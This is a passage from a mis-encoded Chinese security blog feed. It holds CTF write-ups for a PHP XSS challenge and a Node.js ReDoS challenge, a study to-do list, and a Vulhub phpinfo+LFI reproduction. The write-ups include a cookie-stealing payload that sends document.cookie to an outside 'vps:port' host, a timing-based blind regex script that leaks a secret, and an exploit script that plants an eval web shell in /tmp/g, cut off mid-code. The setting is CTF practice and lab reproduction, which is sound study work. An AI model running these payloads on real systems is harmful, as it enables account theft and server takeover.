¼é™åˆ¶æˆ‘ä»¬åªèƒ½å°†æŸä¸ªå±æ€§ç½®ä¸ºfalseã€‚</p><p>lib.phpå¯ä»¥çœ‹è§ä¸€æ®µå…³é”®å‡½æ•°</p><pre><code class="php">    function go(){        if(isset($this-&gt;pre) and isset($this-&gt;after) and isset($this-&gt;location)){            $dest = $this-&gt;pre . $this-&gt;location . $this-&gt;after;            header($dest);        }        else{            // Error occured?            header(&quot;Location: index.php&quot;);        }    }    function __destruct(){        if($this-&gt;flag){            if($this-&gt;location !== $this-&gt;page){                $this-&gt;go();            }        }        ob_end_flush();    }</code></pre><p>ä¸€ä¸ª<code>destruct</code>æ–¹æ³•ï¼Œåœ¨flagä¸ºtrueæ—¶ä¼šè°ƒç”¨<code>go</code>ï¼Œç„¶åï¼Œgoå¾ˆå¥‡å¦™çš„æ‹¼æ¥äº†ä¸‰ä¸ªå‚æ•°è¿›è¡Œ<code>header()</code>è®¾è®¡ã€‚<br>é‚£ä¹ˆæ˜¯å¦åªè¦æˆ‘ä»¬æŠŠheaderæ§åˆ¶ä¸ºgbkç¼–ç ï¼Œå°±å¯ä»¥è§£å†³å‰é¢xssè¢«è½¬ä¹‰çš„é—®é¢˜å‘¢ï¼Ÿæ²¡é”™ã€‚æ‰€ä»¥è¿™é‡Œå°±æ˜¯å…¥æ‰‹ç‚¹ã€‚è½¬è€Œè·Ÿè¿›ä¸‹å…³é”®å‡½æ•°ã€‚</p><pre><code>if($user-&gt;url-&gt;referer != $user-&gt;url-&gt;page){            $user-&gt;url-&gt;location = $user-&gt;url-&gt;referer;        }        $user-&gt;url-&gt;flag = True;</code></pre><p>é¦–å…ˆï¼Œä¼ å€¼answeræ—¶å°±ä¼šè¿›è¡Œflag=1èµ‹å€¼ï¼ŒåŒæ—¶locationå‚æ•°ä¼šèµ‹å€¼ä¸ºæˆ‘ä»¬å¯æ§çš„refererã€‚é‚£ä¹ˆæˆ‘ä»¬çš„ç›®æ ‡å˜æˆé€šè¿‡refereræ§åˆ¶headerã€‚<br>ä¸ºæ­¤å°±è¦è§£å†³<code>pre</code>è¿™ä¸ªæ‹¼æ¥çš„å±æ€§ã€‚è¿™æ—¶æˆ‘ä»¬å‰é¢çš„evalè¯­å¥å°±èµ·ä½œç”¨äº†ã€‚å¦‚æœæŠŠ<code>this-&gt;pre</code>è®¾ä¸ºfalse,åœ¨æ‹¼æ¥æ—¶å®ƒå°±ä¼šå˜æˆç©ºã€‚é‚£ä¹ˆæˆ‘ä»¬çš„å¯æ§å‚æ•°locationç›´æ¥ä¼ è¿›headerã€‚<br>æ—¢ç„¶å¦‚æ­¤ï¼Œpayloadå°±å¯ä»¥æ„é€ äº†ï¼š</p><pre><code>/?answer=user-&gt;url-&gt;pre&amp;referer=Content-Type:text/html; charset=GBK;abc=</code></pre><p>æ­¤å¤„éšä¾¿ç”¨<code>abc</code>ä¹‹ç±»çš„æ‹¼æ¥ä¸‹åé¢çš„<code>this-&gt;after</code>å±æ€§å€¼.phpã€‚<br>è¿™æ ·æˆ‘ä»¬çš„index.phpç»ˆäºå¯ä»¥æ‰“xssäº†ï¼Œå¯ä»¥é€ƒé€¸å•å¼•å·ã€‚</p><pre><code>/index.php?message=%c0%27; alert(1);//</code></pre><p>ç°åœ¨æƒ³æ¥æˆ‘æ¯”èµ›æ—¶å°±æ˜¯è¿™ä¹ˆæ‰“çš„ã€‚ä½†æ˜¯<code>alert(1)</code>æ²¡æˆï¼Œæˆ‘ä»¥ä¸ºæ˜¯payloadé—®é¢˜å°±æ²¡ç»§ç»­åšäº†â€¦â€¦.ç°åœ¨æƒ³æƒ³å®åœ¨æ˜¯æ‹‰èƒ¯ï¼Œè¿™ä¸ªpayloadå°±æ²¡é—®é¢˜å•Šï¼Œä¼°è®¡æ˜¯æˆ‘å“ªé‡Œç»†èŠ‚æœ‰é—®é¢˜å•Šï¼Œåº”è¯¥ç»§ç»­åšä¸‹å»çš„ï¼Œè‰ã€‚<br>ç„¶åå°±æ˜¯å¸¸è§„é—®é¢˜äº†ï¼Œä¸ºäº†è§£å†³æ²¡æœ‰å•å¼•å·çš„é—®é¢˜ä½¿ç”¨string.fromCharCodeï¼Œè¿™ä¸ªæˆ‘ä¹Ÿé¢„å…ˆæƒ³å¥½äº†è¿™æ ·å†™payloadï¼Œå±…ç„¶å› ä¸ºæå‰æ”¾å¼ƒæ²¡ç”¨å‡ºæ¥ï¼Œè¯¥æ‰“ã€‚<br>ç„¶åå°±å¯ä»¥åŠ è½½å†…è”è„šæœ¬äº†ã€‚åŒæ ·å¾ˆç®€å•ï¼Œå› ä¸ºCSPçš„åŸå› å§srcè®¾ç½®æˆä¸Šä¼ æ–‡ä»¶è·¯å¾„å³å¯ã€‚è¿™é‡Œæˆ‘çœ‹æ¢…å­é…’å­¦é•¿çš„æ–‡ç« ä»‹ç»çš„æ˜¯ç”¨.waveæ–‡ä»¶bypassCSPçš„ã€‚ä¸è¿‡ä¹‹å‰çœ‹è¿‡æ–‡ç« ä»‹ç»è¿‡jpegæˆ–è€…å…¶ä»–æ–‡ä»¶bypassCSPä¹Ÿæ˜¯å¯è¡Œçš„ã€‚ä¸è¿‡éœ€è¦è®¾è®¡ä¸€ä¸‹æ–‡ä»¶å¤´ã€‚<br>æ‰€ä»¥payloadæ„é€ ä¸‹ï¼š<br>ä¸Šä¼ å›¾ç‰‡å†…å®¹</p><pre><code>aaaaaaaaaaaaaaa/*bbbbbbbbbbbbbbbbbbb*/=&#39;test&#39;;window.open(&#39;http://vps:port/?&#39;+document.cookie);</code></pre><p>index.phpæ„é€ message</p><pre><code class="javascript">%c0%27; var x=document.createElement(&#39;script&#39;);x.src=&#39;/upload/xxxxx/test.wave&#39;document.body.appendChild(x);//</code></pre><p>æœ€åpayloadè½¬ä¸€ä¸‹charcodeåº”è¯¥å°±è¡Œäº†ã€‚</p><p>è¿™é‡Œå†è†œä¸€ä¸‹æ˜Ÿç›Ÿè·ŸNu1Lç­‰ç­‰æˆ˜é˜Ÿçš„å¸ˆå‚…ä»¬ï¼Œæ•´äº†ä¸ªå·¨ç®€å•çš„éé¢„æœŸã€‚ä¸Šé¢evalè¦†ç›–çš„åœ°æ–¹ç”±äºå‰é¢è°ƒç”¨äº†ä¸€ä¸ªcloneï¼Œæ‰€ä»¥ç›¸å½“äºæ˜¯ä¸ªæ–°çš„userã€‚è¿™æ ·çš„è¯userçš„å±æ€§éƒ½å¯ä»¥æ”¹ã€‚ç”±äºæºç æ‰€æœ‰åŠŸèƒ½éƒ½åœ¨userç±»å®ç°çš„ï¼Œé‚£å°±æ˜¯ä»»æ„å±æ€§éƒ½å¯æ”¹ã€‚ç›´æ¥æŠŠé»‘åå•è¦†ç›–æˆfalse.ç„¶åä¸Šä¼ phpgetshellã€‚flagåœ¨æ ¹ç›®å½•â€¦â€¦<br>éƒå¸ˆå‚…æœ€åä¹Ÿè·Ÿæˆ‘è¯´è¿™ä¸ªæ€è·¯ï¼Œæˆ‘å¼€å§‹è¿˜ä¸æ•¢ä¿¡ã€‚ç»“æœçœŸèƒ½æ•´æˆéé¢„æœŸã€‚å¯æƒœåæ¥è¢«ä¿®å¤äº†ã€‚</p><p>ä¸è¯´äº†ï¼Œæ¯”èµ›æ²¡åšå‡ºæ¥å¤ªé—æ†¾äº†ã€‚æœ‰å¤ç°ç¯å¢ƒçš„è¯ä¸€å®šå»å¤ç°ã€‚</p><h1 id="guessgame"><a href="#guessgame" class="headerlink" title="guessgame"></a>guessgame</h1><p>å…ˆæ‰”ä¸€ä¸ªæºç å®¡å®Œå°±å‡ºçš„payload</p><pre><code>{&quot;user&quot;: {&quot;username&quot;:&quot;admÄ±n888&quot;, &quot;__proto__&quot;: {&quot;enableReg&quot;: True}}}) </code></pre><p>ä¸»è¦æ˜¯ä¸€ä¸ªjså¤§å†™çš„ç»•è¿‡ï¼Œä¸Šæ¬¡å…¬ç›ŠCTFåšè¿‡äº†ã€‚ç„¶åæ˜¯ä¸€ä¸ªè°ƒç”¨äº†mergeçš„åŸå‹é“¾æ±¡æŸ“ã€‚ä¹Ÿæ˜¯ä¸ºäº†è¿›ä¸‹é¢è¿™ä¸ªifã€‚</p><pre><code class="javascript">if(config.enableReg &amp;&amp; noDos(regExp) &amp;&amp; flag.match(regExp)){            //res.end(flag);            //Stop your wishful thinking and go away!        }</code></pre><p>åé¢è¦è·‘flagï¼Œç”¨çš„æ˜¯æ­£åˆ™ç›²æ³¨ã€‚<br>æ‰“æ‰°äº†ï¼Œç¯å¢ƒä¸€ä¸ªä¸ªå¡çš„ä¸€æ¯”ã€‚æˆ‘ä¹Ÿä¸çŸ¥é“æ€ä¹ˆæ³¨ï¼Œ<del>ç­‰ä¸€æ‰‹å®˜æ–¹wpå§ã€‚</del><br>çœ‹åˆ°åˆ«é˜Ÿæ€è·¯äº†ï¼Œå¯ä»¥å­¦ä¸‹ã€‚åŸæ¥noDosè¿™ä¸ªæ­£åˆ™å°±æ˜¯è¦åˆ©ç”¨çš„ã€‚å› ä¸ºæ˜¯ä¸ªæ­£åˆ™åŒ¹é…ï¼Œè€Œjavascriptæ­£åˆ™çš„å›æº¯æœºåˆ¶ä¼šè®©æ¶æ„ä»£ç ä½¿æœåŠ¡ç«¯å¤§é‡å ç”¨æœåŠ¡å†…å­˜ã€‚æ¯”å¦‚ä¸€ä¸ª<code>/Ë†a*a*b$/</code>ï¼Œç”¨<code>aaaaaaaaaaaaa</code>å°±å¯ä»¥è®©å…¶å¤šæ¬¡å›æº¯ï¼Œè¾¾æˆjsçš„re(æ­£åˆ™)dosæ”»å‡»ã€‚<br>æ‰€ä»¥æœ¬é¢˜ç›®çš„å°±æ˜¯è®©nodosè¢«æˆ‘ä»¬çš„å¯æ§qå¡ä½ï¼Œç„¶åå‰é¢å·²ç»åŸå‹é“¾æ±¡æŸ“è¾¾æˆifçš„ä¸€ä¸ªçœŸå€¼äº†ï¼Œå‰©ä¸‹çš„ç›¸å½“äºç›²æ³¨flagä½¿ifç¬¬ä¸‰ä¸ªå€¼è¾¾æˆçœŸå€¼ã€‚</p><pre><code> g3t(((((.*)+)+)+)+)! (((((.*)+)+)+)+)Y</code></pre><p>ç±»ä¼¼å¦‚æ­¤çš„payloadä¸æ–­fuzzã€‚</p><p>3.13ï¼š<br>ä»Šå¤©æŠŠé¢˜ç›®å¤ç°äº†ä¸€ä¸‹ï¼Œç”¨çš„å‡ºé¢˜äººçš„è„šæœ¬åšäº†åšã€‚é¡ºä¾¿ç†è§£äº†ä¸‹reDOSç›²æ³¨çš„åŸºæœ¬æ¦‚å¿µã€‚å½“ç„¶è¦è·Ÿå‡ºé¢˜äººç‚¹èµï¼Œè¿™é¢˜ç®—æ˜¯å¤´ä¸€æ¬¡è€ƒå¯Ÿäº†reDOSçš„çŸ¥è¯†ç‚¹ï¼Œå¯æƒœå› ä¸ºé¶æœºåŸå› ä¸èƒ½ä¿è¯é€‰æ‰‹ä»¬æ­£å¸¸è§£é¢˜ã€‚å¦‚æœå•ç‹¬ä¸‹å‘å®¹å™¨åº”è¯¥ä¼šæ›´ç¨³å®šã€‚<br>å…³äºçŸ¥è¯†ç‚¹:<br>è¯´èµ·æ¥å…¶å®ä¸éš¾ã€‚reDOSé¦–å…ˆéœ€è¦æ˜ç¡®çš„æ˜¯ï¼šä½¿ç”¨äº†jsçš„NFAä½œä¸ºæ­£åˆ™å¼•æ“ã€‚NFAï¼Œå³éç¡®å®šæœ‰é™çŠ¶æ€è‡ªåŠ¨æœºã€‚å…¶å®ï¼Œä¹‹å‰åœ¨pç‰›çš„pcrewafè¿™ä¸€é¢˜ç›®ä¸­å°±å·²ç»æåŠäº†NFAçš„ç‰¹æ€§ã€‚å®ƒæ­£åˆ™åŒ¹é…æ—¶å‡ºç°çš„å›æº¯æœºåˆ¶å°†ä¼šäº§ç”Ÿå¤§é‡å±å®³ã€‚å¯¹phpè€Œè¨€æ˜¯å›æº¯æ¬¡æ•°æœ‰é™å¯¼è‡´bypassã€‚å¯¹ä½œä¸ºæœåŠ¡ç«¯çš„jsè€Œè¨€ï¼Œåˆ™æ˜¯å ç”¨å¤§é‡ç³»ç»Ÿèµ„æºã€‚ä¹‹å‰æ›¾çœ‹åˆ°å›½å¤–å¤§ä½¬å†™çš„ä¸€ä¸ªæ­£åˆ™ï¼Œå¯ä»¥è®©ä¸€æ¬¡jsçš„æ­£åˆ™åŒ¹é…å ç”¨é«˜è¾¾%99çš„å†…å­˜ã€‚</p><p>å›åˆ°è¿™ä¸€çŸ¥è¯†ç‚¹ï¼Œæ¥çœ‹è§£é¢˜çš„ä¸»è¦æ­£åˆ™</p><pre><code>^(?=(some regexp here))((.*)*)*salt$</code></pre><p>ç®€å•è§£é‡Šï¼Œåªè¦æˆ‘ä»¬æ‰€éœ€è¦çš„SECRET(æœ¬é¢˜æ˜¯flag)ä¸ä¸­é—´çš„regexpéƒ¨åˆ†ç›¸åŒ¹é…ï¼Œæ•´ä¸ªæ­£åˆ™å°†å¯¼è‡´æ•´ä¸ªåŒ¹é…è¿‡ç¨‹å»¶æ—¶åˆ°2ç§’å¤šçš„æ—¶é—´ã€‚æ—¢ç„¶å¦‚æ­¤ï¼Œåªè¦èƒ½é€šè¿‡æ„é€ æ­£åˆ™è¡¨è¾¾å¼æ¥æ³¨å…¥ï¼Œå°†è¾¾åˆ°è·Ÿsqlæ—¶é—´ç›²æ³¨ä¸€æ ·çš„æ•ˆæœï¼Œå¾—åˆ°è¿›è¡Œæ­£åˆ™åŒ¹é…çš„flag<br>é™„ä¸Šå‡ºé¢˜äººçš„exp:</p><pre><code class="python">import socketimport sysimport timeimport randomimport stringimport requestsimport re# constantsTHRESHOLD = 2# predicatesdef length_is(n):    return &quot;.{&quot; + str(n) + &quot;}$&quot;def nth_char_is(n, c):    return &quot;.{&quot; + str(n-1) + &quot;}&quot; + re.escape(c) + &quot;.*$&quot;# utilitiesdef redos_if(regexp, salt):    return &quot;^(?={})((((.*)*)*)*)*{}&quot;.format(regexp, salt)def get_request_duration(payload):    try:        _start = time.time()        requests.post(&quot;http://vps:port/verifyFlag&quot;, {&quot;q&quot;: payload})        _end = time.time()        duration = _end - _start    except:        duration = -1        exit(1)    return durationdef prop_holds(prop, salt):    return get_request_duration(redos_if(prop, salt)) &gt; THRESHOLDdef generate_salt():    return &#39;&#39;.join([random.choice(string.ascii_letters) for i in range(10)])if __name__ == &#39;__main__&#39;:    salt = &quot;!&quot;  # generate_salt()    # leak length    upper_bound = 15    secret_length = 0    for i in range(0, upper_bound):        if prop_holds(length_is(i), salt):            secret_length = i    print(&quot;[+] length: {}&quot;.format(secret_length))    S = &quot;qwdfkjurlasetghnioyzxcvbpmQWDFKJURLASETGHNIOYZXCVBPM1234567890&quot;    secret = &quot;&quot;    for i in range(0, secret_length):        for c in S:            if prop_holds(nth_char_is(i+1, c), salt):                secret += c                print(&quot;[*] {}&quot;.format(secret))    print(&quot;[+] secret: {}&quot;.format(secret))</code></pre><p>å‚è€ƒäº†å‡ºé¢˜äººçš„å‚è€ƒæ–‡ç« ï¼š<a href="https://diary.shift-js.info/blind-regular-expression-injection/?tdsourcetag=s_pctim_aiomsg" target="_blank" rel="noopener">https://diary.shift-js.info/blind-regular-expression-injection/?tdsourcetag=s_pctim_aiomsg</a> </p><p>æ¯”èµ›å…¶ä»–é¢˜ç›®ä¸»è¦æ˜¯é˜Ÿå‹åšçš„ï¼ŒåŸºæœ¬æ²¡æ€ä¹ˆçœ‹ã€‚åˆ°æ—¶å€™æœ‰æœºä¼šå»ç ”ç©¶ä¸‹ã€‚<br>ç„¶åå°±æ˜¯åæ€äº†ã€‚ç°åœ¨æ°´å¹³è¿˜å¤ªèœï¼Œèµ¶ç´§å¤šèŠ±ç‚¹æ—¶é—´å­¦å­¦çŸ¥è¯†åˆ·åˆ·é¢˜ã€‚ä¸ç„¶å†èœçš„æŠ è„šå°±ä¸¢äººäº†ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>To-Dolist</title>
      <link href="2020/03/09/To-Dolist/"/>
      <url>2020/03/09/To-Dolist/</url>
      
        <content type="html"><![CDATA[<p>ç¬¬ä¸€æ¬¡ XCTF å°±è‡ªé—­äº†ã€‚æœ€éš¾å—çš„å°±æ˜¯é˜Ÿå‹è¾›è‹¦ä»˜å‡ºï¼Œè‡ªå·±å´åŸºæœ¬æ²¡å•¥è¾“å‡ºâ€¦â€¦<br>ä¹‹å‰å…¬ç›Šèµ›è¿˜ä»¥ä¸ºæœ‰äº†ä¸€å®šæ°´å‡†ï¼Œç°åœ¨çœ‹è¿˜å·®å¾—è¿œå•Šã€‚<br>æ‰€ä»¥ä¸€å®šè¦ä¸€å®šè¦å°½å¿«æŠŠèƒ½åŠ›æå‡èµ·æ¥ï¼Œåˆ·é¢˜å›ºç„¶é‡è¦ï¼ŒçŸ¥è¯†ç‚¹ä¹Ÿä¸èƒ½è½ä¸‹ã€‚<br>è¿™æ¬¡æ¯”èµ›æ‰“ä¸‹æ¥å‘ç°è‡ªå·±å±…ç„¶åªèƒ½åœ¨sqlè·ŸNode.jsä¸‹æ‰‹ï¼Œå¤ªå˜²è®½äº†ã€‚<br>æŠŠè¿‘æœŸä¸€äº›éœ€è¦å½»åº•å¼„æ‡‚çš„çŸ¥è¯†ç‚¹åˆ—ä¸€ä¸‹ï¼Œæ€»æœ‰ä¸€å¤©è¦å…¨éƒ¨è§£å†³ã€‚</p><a id="more"></a><h1 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h1><h2 id="phpçš„ä¸€äº›trick"><a href="#phpçš„ä¸€äº›trick" class="headerlink" title="phpçš„ä¸€äº›trick"></a>phpçš„ä¸€äº›trick</h2><p><del>å†™shell;<br>å‘½ä»¤æ‰§è¡Œ;</del><br><del>bypassæŠ€å·§</del></p><h2 id="phpååºåˆ—åŒ–"><a href="#phpååºåˆ—åŒ–" class="headerlink" title="phpååºåˆ—åŒ–"></a>phpååºåˆ—åŒ–</h2><p><del>ä¸»è¦æ˜¯popé“¾çš„æ„é€ ã€‚<br>ç®€å•çš„å½“ç„¶ä¼šã€‚éš¾çš„å°±å®¹æ˜“æ‹‰èƒ¯ã€‚è¯´ç™½äº†å°±æ˜¯è‡ªå·±å®¡è®¡èƒ½åŠ›å·®ã€‚<br>æœ€å¥½æŠŠtrickéƒ½ææ¸…æ¥šã€‚<br>ç„¶åå†æŠŠä¸‹é¢çš„æ¡†æ¶çš„popé“¾å¼„ä¸€å¼„</del></p><h2 id="tpæ¡†æ¶5-0-6-0"><a href="#tpæ¡†æ¶5-0-6-0" class="headerlink" title="tpæ¡†æ¶5.0 6.0"></a>tpæ¡†æ¶5.0 6.0</h2><h2 id="Laravelæ¡†æ¶"><a href="#Laravelæ¡†æ¶" class="headerlink" title="Laravelæ¡†æ¶"></a>Laravelæ¡†æ¶</h2><h1 id="python"><a href="#python" class="headerlink" title="python"></a>python</h1><h2 id="pythonååºåˆ—åŒ–"><a href="#pythonååºåˆ—åŒ–" class="headerlink" title="pythonååºåˆ—åŒ–"></a>pythonååºåˆ—åŒ–</h2><p><del>è¿™æ¬¡ååºåˆ—åŒ–åƒäº†å¤§äºã€‚ç°å­¦éƒ½å¥½å¤šçœ‹ä¸è¿›å»ã€‚æ—¢ç„¶å¦‚æ­¤é‚£å°±åŠ›æ±‚çº¿ä¸‹å¼„æ˜ç™½ã€‚<br>ä¸»è¦æ˜¯åº•å±‚çš„åŸç†</del></p><h2 id="Flask"><a href="#Flask" class="headerlink" title="Flask"></a>Flask</h2><p><del>æ¡†æ¶é—®é¢˜ã€‚æƒ³åšè¿˜æ˜¯å¾—ä¼šå¼€å‘ã€‚</del></p><h2 id="å¼€å‘çš„"><a href="#å¼€å‘çš„" class="headerlink" title="å¼€å‘çš„"></a>å¼€å‘çš„</h2><p>å¤šçº¿ç¨‹ä»€ä¹ˆçš„ã€‚<br>å†™è„šæœ¬çœæ—¶é—´ã€‚<br><del>py3è·Ÿpy2ä¸€äº›è„šæœ¬çš„å·®åˆ«</del></p><h1 id="java"><a href="#java" class="headerlink" title="java"></a>java</h1><h2 id="javaååºåˆ—åŒ–"><a href="#javaååºåˆ—åŒ–" class="headerlink" title="javaååºåˆ—åŒ–"></a>javaååºåˆ—åŒ–</h2><p>å¥½æ­¹è‡ªå·±æœ‰javaåŸºç¡€ã€‚ä¸æ¥è§¦ä¸‹javaæ¼æ´å¤ªæµªè´¹é‚£ä¸€ç‚¹javaçŸ¥è¯†äº†ã€‚</p><h2 id="spelæ³¨å…¥"><a href="#spelæ³¨å…¥" class="headerlink" title="spelæ³¨å…¥"></a>spelæ³¨å…¥</h2><h2 id="javaweb"><a href="#javaweb" class="headerlink" title="javaweb"></a>javaweb</h2><p>tomcat </p><h1 id="javascript"><a href="#javascript" class="headerlink" title="javascript"></a>javascript</h1><h2 id="xss-csp"><a href="#xss-csp" class="headerlink" title="xss csp"></a>xss csp</h2><p><del>è€æ—©çœ‹è¿‡æ¯”è¾ƒå®Œæ•´çš„å´æ²¡æ€»ç»“ã€‚èµ¶ç´§æ€»ç»“ä¸€æ³¢ã€‚</del></p><h1 id="sqli"><a href="#sqli" class="headerlink" title="sqli"></a>sqli</h1><p>å”¯ä¸€æ¯”è¾ƒè‡ªä¿¡çš„ä¸€é¡¹ã€‚<br>ç»“æœæ¯”èµ›ç¬¬ä¸€é¢˜è¿˜æ˜¯ä¸ä¼šåšã€‚<br>ä¸‡èƒ½å¯†ç ä¹Ÿå·®ç‚¹æ²¡å¼„å‡ºæ¥ã€‚</p><p>ä¹‹å‰æ€»ç»“çš„trickå¯èƒ½éœ€è¦å†ç»†åˆ†ä¸€ä¸‹ã€‚</p><h1 id="å…¶ä»–çš„"><a href="#å…¶ä»–çš„" class="headerlink" title="å…¶ä»–çš„"></a>å…¶ä»–çš„</h1><p>vulhubåœ¨å¤ç°äº†,äº‰å–å†å¤šå¤ç°ä¸€äº›é¢˜ç›®ã€‚</p><p>CSRFï¼ŒCRLFï¼Œäº‰å–å¤šæ‰¾äº›é¢˜ç›®åš;</p><p>æ¸—é€å­¦åˆ°çš„çŸ¥è¯†ä¹Ÿæ˜¯å¯ä»¥æ€»ç»“ä¸‹çš„<br>WEBè¿˜æœ‰å¥½å¤šåŸºç¡€æ²¡æ‰“ç‰¢ã€‚æ‰¾æ—¶é—´è¡¥ä¸€è¡¥ã€‚</p><p>å±¡è´¥å±¡æˆ˜æ‰æ˜¯ä¸€ä¸ªCTFerçš„ä½œé£ã€‚ç°åœ¨æ—¢ç„¶é€‰æ‹©è¿™æ¡è·¯å°±åŠ æ²¹å¹²ä¸‹å»å§ã€‚</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Vulhubå¤ç°</title>
      <link href="2020/03/06/Vulhub%E5%A4%8D%E7%8E%B0/"/>
      <url>2020/03/06/Vulhub%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p>pç‰›å‚ä¸çš„é¡¹ç›®vulhub,å¯¹äºwebå®‰å…¨ä»äº‹äººå‘˜è€Œè¨€åº”è¯¥è¯´æ˜¯å®åº“èˆ¬çš„å­˜åœ¨ã€‚é‡Œé¢è®¸å¤šçš„æ¼æ´éƒ½æ˜¯å€¼å¾—ä¸€ä¸€å»å­¦ä¹ çš„ã€‚åœ¨æ­¤æ„Ÿè°¢é‚£äº›å¤§ä½¬ä¸ºé¡¹ç›®ä½œå‡ºçš„ä»˜å‡ºã€‚æ‰è®©æˆ‘ä»¬èƒ½å¤Ÿè½»æ¾å¤ç°é¢˜ç›®ã€‚<br>ç¯å¢ƒä»githubä¸Šè·å–ã€‚ç¯å¢ƒæ­å»ºåªéœ€<code>docker-compose up -d</code></p><a id="more"></a><h2 id="phpinfo-lfi-shell"><a href="#phpinfo-lfi-shell" class="headerlink" title="phpinfo+lfi=shell"></a>phpinfo+lfi=shell</h2><p>é¦–å…ˆè¯´æ˜ã€‚è¿™æ˜¯ä¸€ä¸ªæ— è§†phpç‰ˆæœ¬çš„æ¼æ´ã€‚å› æ­¤å¯è§å…¶é€šç”¨æ€§ã€‚vulhubä¸Šæä¾›çš„php7çš„ç¯å¢ƒï¼Œä»¥åŠä¸€ä¸ªlfi.phpé¡µé¢æ‰§è¡Œæ–‡ä»¶åŒ…å«ï¼Œä¸€ä¸ªphpinfo.phpæ‰§è¡Œphpinfoã€‚</p><p>æ¼æ´åŸç†ï¼š<br><img src="/2020/03/06/Vulhub%E5%A4%8D%E7%8E%B0/1.PNG" class="lazyload" data-srcset="1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>é¦–å…ˆï¼Œæ¼æ´çš„æ“ä½œé¡ºåºæ˜¯ï¼šè·å–phpinfoä¸­çš„ä¸´æ—¶æ–‡ä»¶å â€“&gt; å¯¹ä¸´æ—¶æ–‡ä»¶è¿›è¡ŒåŒ…å« â€“&gt; phpinfoé¡µé¢æ‰§è¡Œç»“æŸï¼Œé”€æ¯ä¸´æ—¶æ–‡ä»¶ã€‚<br>æ‰€ä»¥å¦‚æœæˆ‘ä»¬è®©phpinfoçš„æ‰§è¡Œæ—¶é—´è¶³å¤Ÿå¤§ï¼Œæˆ‘ä»¬çš„æ–‡ä»¶åŒ…å«å°±æœ‰è¶³å¤Ÿæ—¶é—´æ‰§è¡Œã€‚ä»è€Œäº§ç”Ÿä¸€ä¸ªæ°¸ä¹…çš„shellã€‚<br>æ‰€ä»¥åˆ©ç”¨æ—¶ï¼Œä½¿ç”¨çš„æ˜¯åŸç”Ÿçš„socketæ•°æ®ï¼Œå¾€phpinfoä¸­å¡«å……åƒåœ¾ä¿¡æ¯ã€‚phpçš„é»˜è®¤ç¼“å†²åŒºå¤§å°ä¸º4096ä¸ªå­—èŠ‚ï¼Œå°±ç›¸å½“äºphpæ¯æ¬¡è¿”å›4096ä¸ªå­—èŠ‚ç»™socketè¿æ¥ã€‚è¿™æ ·ï¼Œå½“æˆ‘ä»¬è·å–åˆ°ä¸´æ—¶æ–‡ä»¶åæ—¶ï¼Œå°±ç«‹å³å‘é€æ–‡ä»¶åŒ…å«è¯·æ±‚ã€‚å°±èƒ½æ‰§è¡Œå‘½ä»¤å¹¶å†™å…¥shelläº†ã€‚<br>ä½¿ç”¨vulhubä¸Šçš„expè„šæœ¬:</p><pre><code class="python">#!/usr/bin/python import sysimport threadingimport socketdef setup(host, port):    TAG=&quot;Security Test&quot;    PAYLOAD=&quot;&quot;&quot;%s\r&lt;?php file_put_contents(&#39;/tmp/g&#39;, &#39;&lt;?=eval($_REQUEST[1])?&gt;&#39;)?&gt;\r&quot;&quot;&quot; % TAG    REQ1_DATA=&quot;&quot;&quot;-----------------------------7dbff1ded0714\rContent-Disposition: form-data; name=&quot;dummyname&quot;; filename=&quot;test.txt&quot;\rContent-Type: text/plain\r\r%s-----------------------------7dbff1ded0714--\r&quot;&quot;&quot; % PAYLOAD    padding=&quot;A&quot; * 5000    REQ1=&quot;&quot;&quot;POST /phpinfo.php?a=&quot;&quot;&quot;+padding+&quot;&quot;&quot; HTTP/1.1\rCookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=&quot;&quot;&quot;+padding+&quot;&quot;&quot;\rHTTP_ACCEPT: &quot;&quot;&quot; + padding + &quot;&quot;&quot;\rHTTP_USER_AGENT: &quot;&quot;&quot;+padding+&quot;&quot;&quot;\rHTTP_ACCEPT_LANGUAGE: &quot;&quot;&quot;+padding+&quot;&quot;&quot;\rHTTP_PRAGMA: &quot;&quot;&quot;+padding+&quot;&quot;&quot;\rContent-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\rContent-Length: %s\rHost: %s\r\r%s&quot;&quot;&quot; %(len(REQ1_DATA),host,REQ1_DATA)    #modify this to suit the LFI script       LFIREQ=&quot;&quot;&quot;GET /lfi.php?file=%s HTTP/1.1\rUser-Agent: Mozilla/4.0\rProxy-Connection: Keep-Alive\rHost: %s\r\r\r&quot;&quot;&quot;    return (REQ1, TAG, LFIREQ)def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag):    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)        s.connect((host, port))    s2.connect((host, port))    s.send(phpinforeq)    d = &quot;&quot;    while len(d) &lt; offset:        d += s.recv(offset)    try:        i = d.index(&quot;[tmp_name] =&amp;gt; &quot;)        fn = d[i+17:i+31]    except ValueError:        return None    s2.send(lfireq % (fn, host))    d = s2.recv(4096)    s.close()    s2.close()    if d.find(tag) != -1:        return fncounter=0class ThreadWorker(threading.Thread):    def __init__(self, e, l, m, *args):        threading.Thread.__init__(self)        self.event = e        self.lock =  l        self.maxattempts = m        self.args = args    def run(self):        global counter        while not self.event.is_set():            with self.lock:                if counter &gt;= self.maxattempts:                    return                counter+=1            try:                x = phpInfoLFI(*self.args)                if self.event.is_set():                    break                                if x:                    print &quot;\nGot it! Shell created in /tmp/g&quot;                    self.event.set()            except socket.error:                returndef getOffset(host, port, phpinforeq):    &quot;&quot;&quot;Gets offset of tmp_name in the php output&quot;&quot;&quot;    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    s.connect((host,port))    s.send(phpinforeq)    d = &quot;&quot;    while True:        i = s.recv(4096)        d+=i                if i == 